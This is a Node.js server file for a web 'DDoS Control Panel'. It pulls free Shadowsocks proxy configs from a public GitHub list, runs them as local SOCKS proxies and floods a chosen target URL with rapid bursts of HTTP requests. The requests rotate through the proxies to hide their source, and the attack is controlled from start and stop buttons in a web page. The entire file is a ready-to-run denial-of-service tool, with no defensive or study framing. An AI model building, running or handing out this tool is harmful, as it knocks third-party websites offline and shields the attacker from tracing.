// server.js - Multi-Proxy DDoS Panel with 15‑min proxy refresh (shadowsocks-libev)
const fastify = require('fastify')({ logger: false });

// Load Shadowsocks library – will crash on startup if missing
let ss;
try {
    ss = require('shadowsocks-libev');
    console.log('✅ Shadowsocks-libev loaded');
} catch (e) {
    console.error('❌ Failed to load shadowsocks-libev:', e.message);
    process.exit(1);
}

const { SocksProxyAgent } = require('socks-proxy-agent');
const axios = require('axios');

// ========== CONFIGURATION ==========
const PROXY_LIST_URL = 'https://raw.githubusercontent.com/ebrasha/free-v2ray-public-list/main/ss_configs.txt';
const MAX_PROXIES = 8;
const REQS_PER_BURST = 100;
const BURST_INTERVAL = 10;
const REFRESH_INTERVAL = 15 * 60 * 1000; // 15 minutes

// ========== STATE ==========
let proxyConfigs = [];
let proxyServers = [];
let socksAgents = [];
let currentProxyIndex = 0;
let attackActive = false;
let attackStats = { requests: 0, errors: 0 };

// ========== PROXY MANAGEMENT ==========
function parseSS(url) {
    try {
        let cleanUrl = url.split('#')[0].trim();
        const match = cleanUrl.match(/^ss:\/\/([^@]+)@([^:]+):(\d+)/);
        if (!match) return null;
        const encoded = match[1];
        const server = match[2];
        const port = parseInt(match[3], 10);
        const decoded = Buffer.from(encoded, 'base64').toString();
        const [method, password] = decoded.split(':');
        if (!method || !password) return null;
        return { method, password, server, port };
    } catch (e) {
        return null;
    }
}

async function fetchProxyConfigs() {
    try {
        console.log('Fetching proxy list...');
        const response = await axios.get(PROXY_LIST_URL, { timeout: 10000 });
        const lines = response.data.split('\n');
        const configs = [];
        for (const line of lines) {
            if (line.startsWith('ss://')) {
                const config = parseSS(line);
                if (config) configs.push(config);
            }
        }
        console.log(`Found ${configs.length} valid Shadowsocks configs`);
        return configs;
    } catch (err) {
        console.error('Failed to fetch proxy list:', err.message);
        return [];
    }
}

async function startProxyServer(config, localPort) {
    return new Promise((resolve, reject) => {
        try {
            const server = ss.createServer(config);
            server.listen(localPort, '127.0.0.1', (err) => {
                if (err) return reject(err);
                console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port}`);
                resolve(server);
            });
            server.on('error', (err) => {
                console.error(`❌ Proxy ${localPort} error:`, err.message);
            });
        } catch (err) {
            reject(err);
        }
    });
}

async function startProxyPool() {
    if (proxyConfigs.length === 0) {
        console.error('No proxy configs available');
        return false;
    }
    const shuffled = proxyConfigs.sort(() => 0.5 - Math.random());
    const selected = shuffled.slice(0, MAX_PROXIES);
    proxyServers = [];
    socksAgents = [];
    let basePort = 1080;

    for (let i = 0; i < selected.length; i++) {
        const localPort = basePort + i;
        try {
            const server = await startProxyServer(selected[i], localPort);
            proxyServers.push(server);
            socksAgents.push(new SocksProxyAgent(`socks5://127.0.0.1:${localPort}`));
        } catch (err) {
            console.error(`Failed to start proxy on port ${localPort}:`, err.message);
        }
    }
    console.log(`Started ${socksAgents.length} proxy servers`);
    return socksAgents.length > 0;
}

async function stopProxyPool() {
    for (const server of proxyServers) {
        await new Promise((resolve) => server.close(resolve));
    }
    proxyServers = [];
    socksAgents = [];
    currentProxyIndex = 0;
    console.log('All proxies stopped');
}

// ========== ATTACK ENGINE ==========
async function runAttack(target, duration) {
    const endTime = Date.now() + duration * 1000;
    console.log(`Attack started on ${target} for ${duration}s`);

    while (attackActive && Date.now() < endTime) {
        for (let i = 0; i < REQS_PER_BURST; i++) {
            if (!attackActive) break;
            if (socksAgents.length === 0) break;

            const agent = socksAgents[currentProxyIndex % socksAgents.length];
            currentProxyIndex++;

            axios.get(target, {
                httpAgent: agent,
                httpsAgent: agent,
                timeout: 5000
            }).catch(() => attackStats.errors++)
              .finally(() => attackStats.requests++);
        }
        await new Promise(r => setTimeout(r, BURST_INTERVAL));
    }

    attackActive = false;
    await stopProxyPool();
    console.log('Attack finished');
}

// ========== WEB INTERFACE ==========
const html = `
<!DOCTYPE html>
<html>
<head>
    <title>DDoS Control Panel</title>
    <style>
        body { background: white; font-family: Arial, sans-serif; margin: 40px; color: #333; }
        .container { max-width: 600px; margin: auto; border: 1px solid #ccc; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #222; margin-bottom: 30px; }
        label { display: block; margin: 15px 0 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        .button-group { display: flex; gap: 15px; margin: 25px 0; }
        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.2s; }
        #startBtn { background: #28a745; color: white; }
        #startBtn:hover { background: #218838; }
        #stopBtn { background: #dc3545; color: white; }
        #stopBtn:hover { background: #c82333; }
        .status { text-align: center; padding: 15px; background: #f8f9fa; border-radius: 4px; margin: 20px 0; font-size: 18px; border: 1px solid #eee; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { text-align: center; }
        .stat-value { font-size: 28px; font-weight: bold; color: #007bff; }
        .stat-label { font-size: 12px; color: #666; text-transform: uppercase; margin-top: 5px; }
        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DDoS Control Panel</h1>

        <div class="status" id="status">Online</div>

        <div class="stats">
            <div class="stat-box">
                <div class="stat-value" id="reqCount">0</div>
                <div class="stat-label">Requests</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="errCount">0</div>
                <div class="stat-label">Errors</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="proxyCount">0</div>
                <div class="stat-label">Proxies</div>
            </div>
        </div>

        <label for="target">Target URL (http:// or https://)</label>
        <input type="url" id="target" placeholder="https://example.com" required>

        <label for="duration">Duration (seconds)</label>
        <input type="number" id="duration" value="60" min="1" max="3600">

        <div class="button-group">
            <button id="startBtn">START ATTACK</button>
            <button id="stopBtn">STOP ATTACK</button>
        </div>

        <div class="footer">
            Using up to 8 concurrent Shadowsocks proxies from ebrasha/free-v2ray-public-list (refreshed every 15 min)
        </div>
    </div>

    <script>
        async function updateStatus() {
            try {
                const res = await fetch('/status');
                const data = await res.json();
                document.getElementById('status').innerText = data.running ? 'Attacking' : 'Online';
                document.getElementById('reqCount').innerText = data.stats.requests;
                document.getElementById('errCount').innerText = data.stats.errors;
                document.getElementById('proxyCount').innerText = data.proxies;
            } catch (err) {
                console.error('Status update error:', err);
            }
        }

        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = parseInt(document.getElementById('duration').value);

            if (!target) {
                alert('Please enter a target URL');
                return;
            }

            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, duration })
                });
                // Always try to parse JSON, but if fails, show response text
                let data;
                const contentType = res.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                    data = await res.json();
                } else {
                    const text = await res.text();
                    throw new Error(`Server returned non-JSON: ${text.substring(0,100)}`);
                }
                if (!data.success) {
                    alert('Error: ' + data.error);
                } else {
                    updateStatus();
                }
            } catch (err) {
                alert('Network error: ' + err.message);
                console.error(err);
            }
        }

        async function stopAttack() {
            try {
                const res = await fetch('/stop', { method: 'POST' });
                const data = await res.json();
                if (!data.success) {
                    alert('Error: ' + data.error);
                } else {
                    updateStatus();
                }
            } catch (err) {
                alert('Network error: ' + err.message);
                console.error(err);
            }
        }

        document.getElementById('startBtn').addEventListener('click', startAttack);
        document.getElementById('stopBtn').addEventListener('click', stopAttack);
        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>
`;

// ========== FASTIFY ROUTES ==========
fastify.get('/', (req, reply) => reply.type('text/html').send(html));

fastify.get('/status', (req, reply) => {
    reply.send({
        running: attackActive,
        stats: attackStats,
        proxies: socksAgents.length
    });
});

fastify.post('/start', async (req, reply) => {
    try {
        const { target, duration } = req.body;
        if (!target || !duration) {
            return reply.status(400).send({ success: false, error: 'Missing target or duration' });
        }

        // Stop any ongoing attack
        attackActive = false;
        await stopProxyPool();

        // Ensure we have proxies
        if (proxyConfigs.length === 0) {
            proxyConfigs = await fetchProxyConfigs();
        }
        if (proxyConfigs.length === 0) {
            return reply.status(500).send({ success: false, error: 'No proxies available' });
        }

        // Start proxy pool
        const started = await startProxyPool();
        if (!started) {
            return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
        }

        // Reset stats and start attack
        attackStats = { requests: 0, errors: 0 };
        attackActive = true;

        // Run attack asynchronously
        runAttack(target, duration).catch(console.error);

        reply.send({ success: true });
    } catch (err) {
        console.error('Unhandled error in /start:', err);
        reply.status(500).send({ success: false, error: err.message });
    }
});

fastify.post('/stop', async (req, reply) => {
    try {
        attackActive = false;
        await stopProxyPool();
        reply.send({ success: true });
    } catch (err) {
        console.error('Unhandled error in /stop:', err);
        reply.status(500).send({ success: false, error: err.message });
    }
});

// Global error handler for Fastify
fastify.setErrorHandler((error, request, reply) => {
    console.error('Fastify error:', error);
    reply.status(500).send({ success: false, error: error.message });
});

// ========== INIT ==========
async function init() {
    proxyConfigs = await fetchProxyConfigs();
    // Refresh every 15 minutes in background
    setInterval(async () => {
        const newConfigs = await fetchProxyConfigs();
        if (newConfigs.length > 0) {
            proxyConfigs = newConfigs;
            console.log('Proxy list refreshed (background)');
        }
    }, REFRESH_INTERVAL);

    const port = process.env.PORT || 5000;
    fastify.listen({ port, host: '0.0.0.0' }, (err) => {
        if (err) {
            console.error(err);
            process.exit(1);
        }
        console.log(`Panel running on port ${port}`);
    });
}

init();
